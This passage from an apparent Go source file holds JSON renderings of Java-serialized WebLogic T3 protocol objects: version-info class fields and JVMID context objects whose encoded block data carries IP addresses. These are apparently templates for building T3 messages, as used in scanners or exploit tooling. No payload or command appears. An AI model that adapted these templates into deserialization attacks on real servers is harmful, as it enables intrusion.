                            "name": "minor",
                            "field_type": 73,
                            "field_type_verbose": "int",
                            "class_name_1": null
                          },
                          {
                            "type": 0,
                            "type_verbose": "X_CLASSFIELD",
                            "name": "rollingPatch",
                            "field_type": 73,
                            "field_type_verbose": "int",
                            "class_name_1": null
                          },
                          {
                            "type": 0,
                            "type_verbose": "X_CLASSFIELD",
                            "name": "servicePack",
                            "field_type": 73,
                            "field_type_verbose": "int",
                            "class_name_1": null
                          },
                          {
                            "type": 0,
                            "type_verbose": "X_CLASSFIELD",
                            "name": "temporaryPatch",
                            "field_type": 90,
                            "field_type_verbose": "boolean",
                            "class_name_1": null
                          },
                          {
                            "type": 0,
                            "type_verbose": "X_CLASSFIELD",
                            "name": "implTitle",
                            "field_type": 76,
                            "field_type_verbose": "object",
                            "class_name_1": {
                              "type": 113,
                              "type_verbose": "TC_REFERENCE",
                              "value": "AH4ABQ==",
                              "handle": 8257541
                            }
                          },
                          {
                            "type": 0,
                            "type_verbose": "X_CLASSFIELD",
                            "name": "implVendor",
                            "field_type": 76,
                            "field_type_verbose": "object",
                            "class_name_1": {
                              "type": 113,
                              "type_verbose": "TC_REFERENCE",
                              "value": "AH4ABQ==",
                              "handle": 8257541
                            }
                          },
                          {
                            "type": 0,
                            "type_verbose": "X_CLASSFIELD",
                            "name": "implVersion",
                            "field_type": 76,
                            "field_type_verbose": "object",
                            "class_name_1": {
                              "type": 113,
                              "type_verbose": "TC_REFERENCE",
                              "value": "AH4ABQ==",
                              "handle": 8257541
                            }
                          }
                        ]
                      },
                      "annotations": null,
                      "super_class": {
                        "type": 112,
                        "type_verbose": "TC_NULL"
                      },
                      "dynamic_proxy_class": false,
                      "dynamic_proxy_class_interface_count": 0,
                      "dynamic_proxy_annotation": null,
                      "dynamic_proxy_class_interface_names": null
                    }
                  },
                  "dynamic_proxy_class": false,
                  "dynamic_proxy_class_interface_count": 0,
                  "dynamic_proxy_annotation": null,
                  "dynamic_proxy_class_interface_names": null
                }
              },
              "dynamic_proxy_class": false,
              "dynamic_proxy_class_interface_count": 0,
              "dynamic_proxy_annotation": null,
              "dynamic_proxy_class_interface_names": null
            }
          },
          {
            "type": 119,
            "type_verbose": "TC_BLOCKDATA",
            "is_long": false,
            "size": 2,
            "contents": "AAA="
          },
          {
            "type": 120,
            "type_verbose": "TC_ENDBLOCKDATA"
          }
        ]
      }
    ],
    "handle": 8257537
  }
]`

const contextObj3 = ""

const contextObj4 = `[
  {
    "type": 115,
    "type_verbose": "TC_OBJECT",
    "class_desc": {
      "type": 0,
      "type_verbose": "X_CLASSDESC",
      "detail": {
        "type": 114,
        "type_verbose": "TC_CLASSDESC",
        "is_null": false,
        "class_name": "t3.rjvm.JVMID",
        "serial_version": "3EnCPt4SHio=",
        "handle": 8257536,
        "desc_flag": 12,
        "fields": {
          "type": 0,
          "type_verbose": "X_CLASSFIELDS",
          "field_count": 0,
          "fields": null
        },
        "annotations": null,
        "super_class": {
          "type": 112,
          "type_verbose": "TC_NULL"
        },
        "dynamic_proxy_class": false,
        "dynamic_proxy_class_interface_count": 0,
        "dynamic_proxy_annotation": null,
        "dynamic_proxy_class_interface_names": null
      }
    },
    "class_data": [
      {
        "type": 0,
        "type_verbose": "X_CLASSDATA",
        "fields": null,
        "block_data": null
      },
      {
        "type": 0,
        "type_verbose": "X_CLASSDATA",
        "fields": null,
        "block_data": [
          {
            "type": 119,
            "type_verbose": "TC_BLOCKDATA",
            "is_long": false,
            "size": 77,
            "contents": "IQAAAAAAAAAAAA40Ny4xMDQuMjI5LjIzMgAONDcuMTA0LjIyOS4yMzIJh7QYAAAABwAAG1n///////////////////////////////8="
          },
          {
            "type": 120,
            "type_verbose": "TC_ENDBLOCKDATA"
          }
        ]
      }
    ],
    "handle": 8257537
  }
]`

const contextObj5 = `[
  {
    "type": 115,
    "type_verbose": "TC_OBJECT",
    "class_desc": {
      "type": 0,
      "type_verbose": "X_CLASSDESC",
      "detail": {
        "type": 114,
        "type_verbose": "TC_CLASSDESC",
        "is_null": false,
        "class_name": "t3.rjvm.JVMID",
        "serial_version": "3EnCPt4SHio=",
        "handle": 8257536,
        "desc_flag": 12,
        "fields": {
          "type": 0,
          "type_verbose": "X_CLASSFIELDS",
          "field_count": 0,
          "fields": null
        },
        "annotations": null,
        "super_class": {
          "type": 112,
          "type_verbose": "TC_NULL"
        },
        "dynamic_proxy_class": false,
        "dynamic_proxy_class_interface_count": 0,
        "dynamic_proxy_annotation": null,
        "dynamic_proxy_class_interface_names": null
      }
    },
    "class_data": [
      {
        "type": 0,
        "type_verbose": "X_CLASSDATA",
        "fields": null,
        "block_data": null
      },
      {
        "type": 0,
        "type_verbose": "X_CLASSDATA",
        "fields": null,
        "block_data": [
          {
            "type": 119,
            "type_verbose": "TC_BLOCKDATA",
            "is_long": false,
            "size": 34,
            "contents": "AeDgHxoq0A6jAA8xOTIuMTY4LjEwMS4xNDSp3jenAAAAAA=="
          },
          {
            "type": 120,
            "type_verbose": "TC_ENDBLOCKDATA"
          }
        ]
      }
    ],
    "handle": 8257537
  }
]`
